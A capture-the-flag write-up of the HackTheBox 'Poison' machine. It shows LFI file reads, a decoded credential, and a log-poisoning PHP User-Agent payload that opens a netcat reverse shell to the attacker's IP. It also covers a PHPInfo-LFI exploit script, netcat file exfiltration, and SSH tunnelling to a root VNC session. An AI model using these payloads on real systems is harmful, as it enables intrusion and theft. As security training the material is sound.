---
layout: post
title: HackTheBox Poison
date: 2018-03-24
tags: [HackTheBox, Linux]
---

# Machine Synopsis

Poison is a fairly easy machine which focuses mainly on log poisoning and port forwarding/tunneling. The machine is running FreeBSD which presents a few challenges for novice users as many common binaries from other distros are not available. ([Source](https://www.hackthebox.com/machines/poison))

# Enumeration

```bash
┌──(root㉿shiro)-[/home/shiro/HackTheBox/Poison]
└─# nmap -sC -sV -A -p- 10.10.10.84
Nmap scan report for 10.10.10.84
Host is up (0.0033s latency).
Not shown: 65533 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.2 (FreeBSD 20161230; protocol 2.0)
| ssh-hostkey: 
|   2048 e3:3b:7d:3c:8f:4b:8c:f9:cd:7f:d2:3a:ce:2d:ff:bb (RSA)
|   256 4c:e8:c6:02:bd:fc:83:ff:c9:80:01:54:7d:22:81:72 (ECDSA)
|_  256 0b:8f:d5:71:85:90:13:85:61:8b:eb:34:13:5f:94:3b (ED25519)
80/tcp open  http    Apache httpd 2.4.29 ((FreeBSD) PHP/5.6.32)
|_http-title: Site doesn't have a title (text/html; charset=UTF-8).
|_http-server-header: Apache/2.4.29 (FreeBSD) PHP/5.6.32
No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).
TCP/IP fingerprint:
OS:SCAN(V=7.92%E=4%D=7/18%OT=22%CT=1%CU=43653%PV=Y%DS=2%DC=T%G=Y%TM=62D4BA5
OS:7%P=x86_64-pc-linux-gnu)SEQ(SP=FE%GCD=1%ISR=109%TI=Z%CI=Z%II=RI%TS=21)OP
OS:S(O1=M550NW6ST11%O2=M550NW6ST11%O3=M280NW6NNT11%O4=M550NW6ST11%O5=M218NW
OS:6ST11%O6=M109ST11)WIN(W1=FFFF%W2=FFFF%W3=FFFF%W4=FFFF%W5=FFFF%W6=FFFF)EC
OS:N(R=Y%DF=Y%T=40%W=FFFF%O=M550NW6SLL%CC=Y%Q=)T1(R=Y%DF=Y%T=40%S=O%A=S+%F=
OS:AS%RD=0%Q=)T2(R=N)T3(R=Y%DF=Y%T=40%W=FFFF%S=O%A=S+%F=AS%O=M109NW6ST11%RD
OS:=0%Q=)T4(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T5(R=Y%DF=Y%T=40%W=0%S
OS:=Z%A=S+%F=AR%O=%RD=0%Q=)T6(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T7(R
OS:=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)U1(R=Y%DF=N%T=40%IPL=38%UN=0%R
OS:IPL=G%RID=G%RIPCK=G%RUCK=G%RUD=G)IE(R=Y%DFI=S%T=40%CD=S)

Network Distance: 2 hops
Service Info: OS: FreeBSD; CPE: cpe:/o:freebsd:freebsd

TRACEROUTE (using port 995/tcp)
HOP RTT     ADDRESS
1   3.17 ms 10.10.14.1
2   3.53 ms 10.10.10.84

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 382.09 seconds
```

![website](https://github.com/blankshiro/blankshiro.github.io/blob/main/assets/img/HackTheBox/Poison/website.png?raw=true)

Trying out `listfiles.php` as an input resulted in a webpage showing this code.

```php
Array 
( 
    [0] => . 
    [1] => .. 
    [2] => browse.php 
    [3] => index.php 
    [4] => info.php 
    [5] => ini.php 
    [6] => listfiles.php 
    [7] => phpinfo.php 
    [8] => pwdbackup.txt 
) 
```

It’s also good to note that the URL for this webpage is `http://10.10.10.84/browse.php?file=listfiles.php` which suggests that there might be a LFI vulnerability.



# Exploit

## Method 1 - LFI

From the list of files, the most interesting file would be `pwdbackup.txt`, so lets try to view it using LFI - `http://10.10.10.84/browse.php?file=pwdbackup.txt`!

```
This password is secure, it's encoded atleast 13 times.. what could go wrong really.. Vm0wd2QyUXlVWGxWV0d4WFlURndVRlpzWkZOalJsWjBUVlpPV0ZKc2JETlhhMk0xVmpKS1IySkVU bGhoTVVwVVZtcEdZV015U2tWVQpiR2hvVFZWd1ZWWnRjRWRUTWxKSVZtdGtXQXBpUm5CUFdWZDBS bVZHV25SalJYUlVUVlUxU1ZadGRGZFZaM0JwVmxad1dWWnRNVFJqCk1EQjRXa1prWVZKR1NsVlVW M040VGtaa2NtRkdaR2hWV0VKVVdXeGFTMVZHWkZoTlZGSlRDazFFUWpSV01qVlRZVEZLYzJOSVRs WmkKV0doNlZHeGFZVk5IVWtsVWJXaFdWMFZLVlZkWGVHRlRNbEY0VjI1U2ExSXdXbUZEYkZwelYy eG9XR0V4Y0hKWFZscExVakZPZEZKcwpaR2dLWVRCWk1GWkhkR0ZaVms1R1RsWmtZVkl5YUZkV01G WkxWbFprV0dWSFJsUk5WbkJZVmpKMGExWnRSWHBWYmtKRVlYcEdlVmxyClVsTldNREZ4Vm10NFYw MXVUak5hVm1SSFVqRldjd3BqUjJ0TFZXMDFRMkl4WkhOYVJGSlhUV3hLUjFSc1dtdFpWa2w1WVVa T1YwMUcKV2t4V2JGcHJWMGRXU0dSSGJFNWlSWEEyVmpKMFlXRXhXblJTV0hCV1ltczFSVmxzVm5k WFJsbDVDbVJIT1ZkTlJFWjRWbTEwTkZkRwpXbk5qUlhoV1lXdGFVRmw2UmxkamQzQlhZa2RPVEZk WGRHOVJiVlp6VjI1U2FsSlhVbGRVVmxwelRrWlplVTVWT1ZwV2EydzFXVlZhCmExWXdNVWNLVjJ0 NFYySkdjR2hhUlZWNFZsWkdkR1JGTldoTmJtTjNWbXBLTUdJeFVYaGlSbVJWWVRKb1YxbHJWVEZT Vm14elZteHcKVG1KR2NEQkRiVlpJVDFaa2FWWllRa3BYVmxadlpERlpkd3BOV0VaVFlrZG9hRlZz WkZOWFJsWnhVbXM1YW1RelFtaFZiVEZQVkVaawpXR1ZHV210TmJFWTBWakowVjFVeVNraFZiRnBW VmpOU00xcFhlRmRYUjFaSFdrWldhVkpZUW1GV2EyUXdDazVHU2tkalJGbExWRlZTCmMxSkdjRFpO Ukd4RVdub3dPVU5uUFQwSwo= 
```

On first glance, the ciphertext looks like a base64 encoding.

Placing the ciphertext into [CyberChef](https://gchq.github.io/CyberChef/#recipe=Remove_whitespace(true,true,true,true,true,false)From_Base64('A-Za-z0-9%2B/%3D',true,false)&input=UTJoaGNtbDRJVElqTkNVMkpqZ29NQT09Cg) and decoding it multiple times, we finally reach a readable plaintext `Charix!2#4%6&8(0`.

The decoded plaintext looks like a password to a user so I guess now we have to find the corresponding username!

The first thing that came to mind was to find the `/etc/passwd` file using LFI again - `http://10.10.10.84/browse.php?file=../../../../../etc/passwd`.

```bash
# $FreeBSD: releng/11.1/etc/master.passwd 299365 2016-05-10 12:47:36Z bcr $ # root:*:0:0:Charlie &:/root:/bin/csh toor:*:0:0:Bourne-again Superuser:/root: daemon:*:1:1:Owner of many system processes:/root:/usr/sbin/nologin operator:*:2:5:System &:/:/usr/sbin/nologin bin:*:3:7:Binaries Commands and Source:/:/usr/sbin/nologin tty:*:4:65533:Tty Sandbox:/:/usr/sbin/nologin kmem:*:5:65533:KMem Sandbox:/:/usr/sbin/nologin games:*:7:13:Games pseudo-user:/:/usr/sbin/nologin news:*:8:8:News Subsystem:/:/usr/sbin/nologin man:*:9:9:Mister Man Pages:/usr/share/man:/usr/sbin/nologin sshd:*:22:22:Secure Shell Daemon:/var/empty:/usr/sbin/nologin smmsp:*:25:25:Sendmail Submission User:/var/spool/clientmqueue:/usr/sbin/nologin mailnull:*:26:26:Sendmail Default User:/var/spool/mqueue:/usr/sbin/nologin bind:*:53:53:Bind Sandbox:/:/usr/sbin/nologin unbound:*:59:59:Unbound DNS Resolver:/var/unbound:/usr/sbin/nologin proxy:*:62:62:Packet Filter pseudo-user:/nonexistent:/usr/sbin/nologin _pflogd:*:64:64:pflogd privsep user:/var/empty:/usr/sbin/nologin _dhcp:*:65:65:dhcp programs:/var/empty:/usr/sbin/nologin uucp:*:66:66:UUCP pseudo-user:/var/spool/uucppublic:/usr/local/libexec/uucp/uucico pop:*:68:6:Post Office Owner:/nonexistent:/usr/sbin/nologin auditdistd:*:78:77:Auditdistd unprivileged user:/var/empty:/usr/sbin/nologin www:*:80:80:World Wide Web Owner:/nonexistent:/usr/sbin/nologin _ypldap:*:160:160:YP LDAP unprivileged user:/var/empty:/usr/sbin/nologin hast:*:845:845:HAST unprivileged user:/var/empty:/usr/sbin/nologin nobody:*:65534:65534:Unprivileged user:/nonexistent:/usr/sbin/nologin _tss:*:601:601:TrouSerS user:/var/empty:/usr/sbin/nologin messagebus:*:556:556:D-BUS Daemon User:/nonexistent:/usr/sbin/nologin avahi:*:558:558:Avahi Daemon User:/nonexistent:/usr/sbin/nologin cups:*:193:193:Cups Owner:/nonexistent:/usr/sbin/nologin charix:*:1001:1001:charix:/home/charix:/bin/csh 
```

Great! We have a user `charix` which is similar to the password `Charix!2#4%6&8(0`.

Now that we have the username and password, lets try `SSH`!

```bash
┌──(root㉿shiro)-[/home/shiro/HackTheBox/Poison]
└─# ssh charix@10.10.10.84                                       
The authenticity of host '10.10.10.84 (10.10.10.84)' can't be established.
ED25519 key fingerprint is SHA256:ai75ITo2ASaXyYZVscbEWVbDkh/ev+ClcQsgC6xmlrA.
This key is not known by any other names
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '10.10.10.84' (ED25519) to the list of known hosts.
(charix@10.10.10.84) Password for charix@Poison:Charix!2#4%6&8(0
...
charix@Poison:~ % 
```

## Method 2 - Log Poisoning

According to `phpinfo.php`, the system is running on `FreeBSD`. Lets check out where are the logs stored in this system.

Searching `freebsd web server log location` on Google resulted in this [webpage](https://blog.codeasite.com/how-do-i-find-apache-http-server-log-files/) which states that the log file location is at `/var/log/httpd-access.log`.

Now, lets open up BurpSuite and play around with the logs! OwO

```http
- Request - 
GET /browse.php?file=/var/log/httpd-access.log HTTP/1.1
Host: 10.10.10.84
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:91.0) Gecko/20100101 Firefox/91.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Connection: close
Upgrade-Insecure-Requests: 1
Cache-Control: max-age=0

- Response -
HTTP/1.1 200 OK
Date: Mon, 18 Jul 2022 02:32:14 GMT
Server: Apache/2.4.29 (FreeBSD) PHP/5.6.32
X-Powered-By: PHP/5.6.32
Connection: close
Content-Type: text/html; charset=UTF-8
Content-Length: 31507
...
10.10.14.2 - - [18/Jul/2022:03:31:39 +0200] "GET /browse.php?file=listfiles.php HTTP/1.1" 200 192 "http://10.10.10.84/" "Mozilla/5.0 (X11; Linux x86_64; rv:91.0) Gecko/20100101 Firefox/91.0"
...
```

Notice that in the logs, the User Agent is being logged, which is something that we can control!

Could we possibly change the User Agent to a reverse shell command?

```http
- Request -
GET /browse.php?file=/var/log/httpd-access.log HTTP/1.1
Host: 10.10.10.84
User-Agent: <?php exec('rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.14.2 1234 >/tmp/f') ?>
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Connection: close
Upgrade-Insecure-Requests: 1
Cache-Control: max-age=0

- Response -
HTTP/1.1 200 OK
Date: Mon, 18 Jul 2022 02:37:41 GMT
Server: Apache/2.4.29 (FreeBSD) PHP/5.6.32
X-Powered-By: PHP/5.6.32
Connection: close
Content-Type: text/html; charset=UTF-8
Content-Length: 31694
...
```

Now that our reverse shell code is stored in the logs, we can just open up a netcat listener and execute the code by calling the log file on the server!

```bash
- Request -
GET /browse.php?file=/var/log/httpd-access.log HTTP/1.1
Host: 10.10.10.84
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:52.0) Gecko/20100101 Firefox/52.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Connection: close
Upgrade-Insecure-Requests: 1
Cache-Control: max-age=0

- Netcat listener -
┌──(root㉿shiro)-[/home/shiro/HackTheBox/Poison]
└─# nc -nlvp 1234                                             
listening on [any] 1234 ...
connect to [10.10.14.2] from (UNKNOWN) [10.10.10.84] 16068
sh: can't access tty; job control turned off
$ whoami
www
```

## Method 3 - PHPInfo to LFI

There is an exploit available on [PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/File%20Inclusion/phpinfolfi.py) that could trigger a RCE if a web server has a LFI vulnerability and also showed the PHPInfo webpage. This web server satisfies both the requirement.

Before we can use the exploit, we have to modify a few parameters in the script.

-   Change the `PAYLOAD` to the PHP reverse shell found on `/usr/share/laudanum/php/php-reverse-shell.php`.
-   Change the `LFIREQ` to `GET /browse.php?file=%s HTTP/1.1\r`.
-   Change all occurrences of `[tmp_name] =>` to `[tmp_name] =&gt`.

>   Couldn’t have done this without reading the writeup from this medium [article](https://medium.com/swlh/hack-the-box-poison-writeup-w-o-metasploit-a6acfdf52ac5).

```bash
┌──(root㉿shiro)-[/home/shiro/HackTheBox/Poison]
└─# python phpinfolfi.py 10.10.10.84 
Don't forget to modify the LFI URL
LFI With PHPInfo()
-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
Getting initial offset... found [tmp_name] at 112940
Spawning worker pool (10)...
  10 /  1000
Got it! Shell created in /tmp/g

Woot!  \m/
Shuttin' down...

- Netcat listener -
┌──(root㉿shiro)-[/home/shiro/HackTheBox/Poison]
└─# nc -nlvp 1234            
listening on [any] 1234 ...
connect to [10.10.14.2] from (UNKNOWN) [10.10.10.84] 47661
FreeBSD Poison 11.1-RELEASE FreeBSD 11.1-RELEASE #0 r321309: Fri Jul 21 02:08:28 UTC 2017     root@releng2.nyi.freebsd.org:/usr/obj/usr/src/sys/GENERIC  amd64
 5:32AM  up 16 mins, 1 users, load averages: 0.28, 0.35, 0.27
USER       TTY      FROM                                      LOGIN@  IDLE WHAT
charix     pts/1    10.10.14.2                                5:21AM    11 -cs 
uid=80(www) gid=80(www) groups=80(www)
sh: can't access tty; job control turned off
$ whoami
www
```

# Privilege Escalation

Looking at `charix`'s home directory showed an interesting `secret.zip` file.

```bash
charix@Poison:~ % ls
secret.zip	user.txt
```

Lets transfer this over to our machine!

```bash
- Terminal - 
┌──(root㉿shiro)-[/home/shiro/HackTheBox/Poison]
└─# nc -nlvp 1111 > secret.zip
listening on [any] 1111 ...

- SSH -
charix@Poison:~ % nc -w 3 10.10.14.2 1111 < secret.zip

- Terminal - 
┌──(root㉿shiro)-[/home/shiro/HackTheBox/Poison]
└─# nc -nlvp 1111 > secret.zip
listening on [any] 1111 ...
connect to [10.10.14.2] from (UNKNOWN) [10.10.10.84] 63902

┌──(root㉿shiro)-[/home/shiro/HackTheBox/Poison]
└─# ls
secret.zip
```

Unzipping the file requires a password. Luckily, the password for the file is the same as the password for SSH! :)

```bash
┌──(root㉿shiro)-[/home/shiro/HackTheBox/Poison]
└─# unzip secret.zip                         
Archive:  secret.zip
[secret.zip] secret password: Charix!2#4%6&8(0
 extracting: secret                  

┌──(root㉿shiro)-[/home/shiro/HackTheBox/Poison]
└─# file secret            
secret: Non-ISO extended-ASCII text, with no line terminators                                            
┌──(root㉿shiro)-[/home/shiro/HackTheBox/Poison]
└─# cat secret                                            
��[|Ֆz!              
```

Huh? It seems to be some weird encoded text. Well, I guess we have to find something else then.

Another thing that came to mind was to find out what running processes there are on the system.

```bash
charix@Poison:~ % ps -aux
USER   PID  %CPU %MEM    VSZ   RSS TT  STAT STARTED     TIME COMMAND
...
root   529   0.0  0.9  23620  8872 v0- I    03:28    0:00.03 Xvnc :1 -desktop X -httpd /usr/local/share/tightvnc/clas
root   540   0.0  0.7  67220  7064 v0- I    03:28    0:00.02 xterm -geometry 80x24+10+10 -ls -title X Desktop
...
```

Oh? There is a `VNC` process running as root!

Lets grab more information about this process.

```bash
charix@Poison:~ % ps -auxww | grep vnc
root   529   0.0  0.9  23620  8872 v0- I    03:28    0:00.03 Xvnc :1 -desktop X -httpd /usr/local/share/tightvnc/classes -auth /root/.Xauthority -geometry 1280x800 -depth 24 -rfbwait 120000 -rfbauth /root/.vnc/passwd -rfbport 5901 -localhost -nolisten tcp :1
charix 873   0.0  0.0    412   328  1  R+   04:54    0:00.00 grep vnc
```

Based on the `-rfbport` flag, it seems that the `VNC` process is running on port `5901`.

Lets verify this with `netstat`!

```bash
charix@Poison:~ % netstat -an 
Active Internet connections (including servers)
Proto Recv-Q Send-Q Local Address          Foreign Address        (state)
tcp4       0      0 10.10.10.84.61099      10.10.14.2.1234        CLOSE_WAIT
tcp4       0      0 10.10.10.84.80         10.10.14.2.51240       CLOSE_WAIT
tcp4       0      0 10.10.10.84.16068      10.10.14.2.1234        CLOSE_WAIT
tcp4       0      0 10.10.10.84.80         10.10.14.2.59216       CLOSE_WAIT
tcp4       0      0 10.10.10.84.35037      10.10.14.2.1234        CLOSE_WAIT
tcp4       0      0 10.10.10.84.80         10.10.14.2.46732       CLOSE_WAIT
tcp4       0      0 10.10.10.84.22         10.10.14.2.37036       ESTABLISHED
tcp4       0      0 127.0.0.1.25           *.*                    LISTEN
tcp4       0      0 *.80                   *.*                    LISTEN
tcp6       0      0 *.80                   *.*                    LISTEN
tcp4       0      0 *.22                   *.*                    LISTEN
tcp6       0      0 *.22                   *.*                    LISTEN
tcp4       0      0 127.0.0.1.5801         *.*                    LISTEN
tcp4       0      0 127.0.0.1.5901         *.*                    LISTEN
udp4       0      0 *.514                  *.*                    
udp6       0      0 *.514                  *.*      
...
```

Since we can’t access the VNC software from our machine, we have to use port forwarding to grant us access.

```bash
- Terminal -
┌──(root㉿shiro)-[/home/shiro/HackTheBox/Poison]
└─# ssh -L 9999:127.0.0.1:5901 charix@10.10.10.84
(charix@10.10.10.84) Password for charix@Poison:Charix!2#4%6&8(0
...

- New Terminal - 
┌──(root㉿shiro)-[/home/shiro/HackTheBox/Poison]
└─# netstat -an | grep LISTEN
tcp        0      0 127.0.0.1:9999          0.0.0.0:*               LISTEN      
tcp6       0      0 ::1:9999                :::*                    LISTEN     
...
```

>   Since this was something new, I had to learn it from a writeup that can be found from this medium [article](https://medium.com/swlh/hack-the-box-poison-writeup-w-o-metasploit-a6acfdf52ac5).
>
>   `ssh -L [local-port]:[remote-ip]:[remote-port]`
>
>   The above command allocates a socket to listen to port 9999 on localhost from my attack machine (kali). Whenever a connection is made to port 9999, the connection is forwarded over a secure channel and is made to port 5901 on localhost on the target machine (poison).

Finally, we can connect to the VNC software from our own machine!

```bash
┌──(root㉿shiro)-[/home/shiro/HackTheBox/Poison]
└─# vncviewer 127.0.0.1:9999 -passwd secret
Connected to RFB server, using protocol version 3.8
Enabling TightVNC protocol extensions
Performing standard VNC authentication
Authentication successful
Desktop name "root's X desktop (Poison:1)"
VNC server default format:
  32 bits per pixel.
  Least significant byte first in each pixel.
  True colour: max red 255 green 255 blue 255, shift red 16 green 8 blue 0
Warning: Cannot convert string "-*-helvetica-bold-r-*-*-16-*-*-*-*-*-*-*" to type FontStruct
Using default colormap which is TrueColor.  Pixel format:
  32 bits per pixel.
  Least significant byte first in each pixel.
  True colour: max red 255 green 255 blue 255, shift red 16 green 8 blue 0
Same machine: preferring raw encoding
```

![vncviewer](https://github.com/blankshiro/blankshiro.github.io/blob/main/assets/img/HackTheBox/Poison/vncviewer.png?raw=true)

```bash
root@Poison:~ # ls /home
charix

root@Poison:~ # cat /home/charix/user.txt
eaacdfb2d141b72a589233063604209c

root@Poison:~ # cat /root/root.txt
716d04b188419cf2bb99d891272361f5
```
